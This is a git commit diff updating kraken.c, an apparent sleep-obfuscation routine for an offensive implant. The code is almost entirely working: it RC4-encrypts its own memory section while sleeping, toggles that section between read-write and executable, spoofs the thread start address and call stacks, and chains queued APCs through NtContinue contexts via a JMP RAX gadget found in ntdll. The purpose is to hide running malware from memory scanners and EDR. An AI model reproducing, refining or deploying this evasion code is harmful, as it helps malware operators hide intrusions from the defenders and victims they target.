dd4936b45a6544b1dc51c8f856bb31b7ce9af34d
RtlDallas <141521637+RtlDallas@users.noreply.github.com>
2023-10-09 20:31:43 +0200

    Update kraken.c

--- kraken.c
+++ kraken.c
@@ -14,21 +14,16 @@ VOID KrakenSleep(DWORD dwSleepTime) {
 	CONTEXT ctxEvent = { 0 };
 	CONTEXT ctxEnd = { 0 };
 
-	PVOID pNtdllAddr							= GetNtdllAddr();
-	PVOID pAdvAPI								= SPOOF(LoadLibraryA, "Advapi32");
-	
-	UINT_PTR pTpReleaseCleanupGroupMembers					= SPOOF(GetProcAddress, pNtdllAddr, "TpReleaseCleanupGroupMembers");
-	PVOID	 pNtContinue							= SPOOF(GetProcAddress, pNtdllAddr, "NtContinue");
-	PVOID pNtTestAlert							= SPOOF(GetProcAddress, pNtdllAddr, "NtTestAlert");
-	PVOID pSystemFunction032						= SPOOF(GetProcAddress, pAdvAPI, "SystemFunction032");
+	INSTANCE Inst = { 0 };
+	InitInstance(&Inst);
 
-	fnNtAlertResumeThread pNtAlertResumeThread				= SPOOF(GetProcAddress, pNtdllAddr, "NtAlertResumeThread");
-	fnNtSignalAndWaitForSingleObject pNtSignalAndWaitForSingleObject	= SPOOF(GetProcAddress, pNtdllAddr, "NtSignalAndWaitForSingleObject");
-
-	HANDLE hEvent = SPOOF_0(CreateEventW);
-
+	HANDLE hEvent = SPOOF(Inst.wFunction.pCreateEventW);
 	BYTE bKey[16] = "AAAAAAAAAAAAAAAA";
-	GenerateKey(&bKey, 16);
+
+	BCRYPT_ALG_HANDLE hAlgorithm = NULL;
+	SPOOF(Inst.wFunction.pBCryptOpenAlgorithmProvider, &hAlgorithm, BCRYPT_RNG_ALGORITHM, NULL);
+	SPOOF(Inst.wFunction.pBCryptGenRandom, hAlgorithm, &bKey, 16);
+	SPOOF(Inst.wFunction.pBCryptCloseAlgorithmProvider, hAlgorithm, 0);
 
 	SECTION_INFO SecInfo = { 0 };
 	TakeSectionInfo(&SecInfo);
@@ -43,73 +38,81 @@ VOID KrakenSleep(DWORD dwSleepTime) {
 	usData.Length = usData.MaximumLength = SecInfo.dwSize;
 
 	// We spoof the thread start address
-	pTpReleaseCleanupGroupMembers += 0x450;
-	HANDLE hThread = CreateThread(NULL, 65535, pTpReleaseCleanupGroupMembers, NULL, CREATE_SUSPENDED, &dwTid);
+	HANDLE hThread = SPOOF(Inst.wFunction.pCreateThread, NULL, 65535, Inst.wFunction.pTpReleaseCleanupGroupMembers, NULL, CREATE_SUSPENDED, &dwTid);
+
+	// We take addr of JMP RAX gadget
+	PVOID pJmpRaxGadget = FindGadget(Inst.wModule.pNtdll, fnGadgetJmpRax);
 
 	if (hThread != NULL) {
 		DWORD dwOldProtect = 0;
-		SPOOF(GetThreadContext, hThread, &ctx);
+		SPOOF(Inst.wFunction.pGetThreadContext, hThread, &ctx);
 
-		RtlCopyMemory(&ctxA, &ctx, sizeof(CONTEXT));
-		RtlCopyMemory(&ctxB, &ctx, sizeof(CONTEXT));
-		RtlCopyMemory(&ctxC, &ctx, sizeof(CONTEXT));
-		RtlCopyMemory(&ctxD, &ctx, sizeof(CONTEXT));
-		RtlCopyMemory(&ctxE, &ctx, sizeof(CONTEXT));
-		RtlCopyMemory(&ctxEvent, &ctx, sizeof(CONTEXT));
-		RtlCopyMemory(&ctxEnd, &ctx, sizeof(CONTEXT));
+		MyMemncpy(&ctxA, &ctx, sizeof(CONTEXT));
+		MyMemncpy(&ctxB, &ctx, sizeof(CONTEXT));
+		MyMemncpy(&ctxC, &ctx, sizeof(CONTEXT));
+		MyMemncpy(&ctxD, &ctx, sizeof(CONTEXT));
+		MyMemncpy(&ctxE, &ctx, sizeof(CONTEXT));
+		MyMemncpy(&ctxEvent, &ctx, sizeof(CONTEXT));
+		MyMemncpy(&ctxEnd, &ctx, sizeof(CONTEXT));
 
-		ctxA.Rip = VirtualProtect;
+		ctxA.Rip = pJmpRaxGadget;
+		ctxA.Rax = Inst.wFunction.pVirtualProtect;
 		ctxA.Rcx = SecInfo.pAddr;
 		ctxA.Rdx = SecInfo.dwSize;
 		ctxA.R8 = PAGE_READWRITE;
 		ctxA.R9 = &dwOldProtect;
-		*(PULONG_PTR)ctxA.Rsp = (ULONG_PTR)pNtTestAlert;
+		*(PULONG_PTR)ctxA.Rsp = (ULONG_PTR)Inst.wFunction.pNtTestAlert;
 
-
-		ctxB.Rip = pSystemFunction032;
+		ctxB.Rip = pJmpRaxGadget;
+		ctxB.Rax = Inst.wFunction.pSystemFunction032;
 		ctxB.Rcx = &usData;
 		ctxB.Rdx = &usKey;
-		*(PULONG_PTR)ctxB.Rsp = (ULONG_PTR)pNtTestAlert;
+		*(PULONG_PTR)ctxB.Rsp = (ULONG_PTR)Inst.wFunction.pNtTestAlert;
 
-		ctxC.Rip = WaitForSingleObject;
+		ctxC.Rip = pJmpRaxGadget;
+		ctxC.Rax = Inst.wFunction.pWaitForSingleObject;
 		ctxC.Rcx = (HANDLE)-1;
 		ctxC.Rdx = dwSleepTime;
-		*(PULONG_PTR)ctxC.Rsp = (ULONG_PTR)pNtTestAlert;
+		*(PULONG_PTR)ctxC.Rsp = (ULONG_PTR)Inst.wFunction.pNtTestAlert;
 
-		ctxD.Rip = pSystemFunction032;
+		ctxD.Rip = pJmpRaxGadget;
+		ctxD.Rax = Inst.wFunction.pSystemFunction032;
 		ctxD.Rcx = &usData;
 		ctxD.Rdx = &usKey;
-		*(PULONG_PTR)ctxD.Rsp = (ULONG_PTR)pNtTestAlert;
+		*(PULONG_PTR)ctxD.Rsp = (ULONG_PTR)Inst.wFunction.pNtTestAlert;
 
-		ctxE.Rip = VirtualProtect;
+		ctxE.Rip = pJmpRaxGadget;
+		ctxE.Rax = Inst.wFunction.pVirtualProtect;
 		ctxE.Rcx = SecInfo.pAddr;
 		ctxE.Rdx = SecInfo.dwSize;
 		ctxE.R8 = PAGE_EXECUTE_READWRITE;
 		ctxE.R9 = &dwOldProtect;
-		*(PULONG_PTR)ctxE.Rsp = (ULONG_PTR)pNtTestAlert;
+		*(PULONG_PTR)ctxE.Rsp = (ULONG_PTR)Inst.wFunction.pNtTestAlert;
 
-		ctxEvent.Rip = SetEvent;
+		ctxEvent.Rip = pJmpRaxGadget;
+		ctxEvent.Rax = Inst.wFunction.pSetEvent;
 		ctxEvent.Rcx = hEvent;
-		*(PULONG_PTR)ctxEvent.Rsp = (ULONG_PTR)pNtTestAlert;
+		*(PULONG_PTR)ctxEvent.Rsp = (ULONG_PTR)Inst.wFunction.pNtTestAlert;
 
-		ctxEnd.Rip = ExitThread;
+		ctxEnd.Rip = pJmpRaxGadget;
+		ctxEnd.Rax = Inst.wFunction.pRtlExitUserThread;
 		ctxEnd.Rcx = 0;
-		*(PULONG_PTR)ctxEnd.Rsp = (ULONG_PTR)pNtTestAlert;
+		*(PULONG_PTR)ctxEnd.Rsp = (ULONG_PTR)Inst.wFunction.pNtTestAlert;
 
-		SPOOF(QueueUserAPC, (PAPCFUNC)pNtContinue, hThread, &ctxA);
-		SPOOF(QueueUserAPC, (PAPCFUNC)pNtContinue, hThread, &ctxB);
-		SPOOF(QueueUserAPC, (PAPCFUNC)pNtContinue, hThread, &ctxC);
-		SPOOF(QueueUserAPC, (PAPCFUNC)pNtContinue, hThread, &ctxD);
-		SPOOF(QueueUserAPC, (PAPCFUNC)pNtContinue, hThread, &ctxE);
-		SPOOF(QueueUserAPC, (PAPCFUNC)pNtContinue, hThread, &ctxEvent);
-		SPOOF(QueueUserAPC, (PAPCFUNC)pNtContinue, hThread, &ctxEnd);
+		SPOOF(Inst.wFunction.pQueueUserAPC, (PAPCFUNC)Inst.wFunction.pNtContinue, hThread, &ctxA);
+		SPOOF(Inst.wFunction.pQueueUserAPC, (PAPCFUNC)Inst.wFunction.pNtContinue, hThread, &ctxB);
+		SPOOF(Inst.wFunction.pQueueUserAPC, (PAPCFUNC)Inst.wFunction.pNtContinue, hThread, &ctxC);
+		SPOOF(Inst.wFunction.pQueueUserAPC, (PAPCFUNC)Inst.wFunction.pNtContinue, hThread, &ctxD);
+		SPOOF(Inst.wFunction.pQueueUserAPC, (PAPCFUNC)Inst.wFunction.pNtContinue, hThread, &ctxE);
+		SPOOF(Inst.wFunction.pQueueUserAPC, (PAPCFUNC)Inst.wFunction.pNtContinue, hThread, &ctxEvent);
+		SPOOF(Inst.wFunction.pQueueUserAPC, (PAPCFUNC)Inst.wFunction.pNtContinue, hThread, &ctxEnd);
 
 		ULONG abcd = 0;
-		pNtAlertResumeThread(hThread, &abcd);
-		pNtSignalAndWaitForSingleObject( hEvent, hThread, TRUE, NULL);
-
-		SPOOF(TerminateThread, hThread);
+		SPOOF(Inst.wFunction.pNtAlertResumeThread, hThread, &abcd);
+		((fnWaitForSingleObject)Inst.wFunction.pWaitForSingleObject)(hEvent, INFINITE);
+		
+		
 	}
-	SPOOF(CloseHandle, hThread);
+	SPOOF(Inst.wFunction.pCloseHandle, hThread);
 
 }
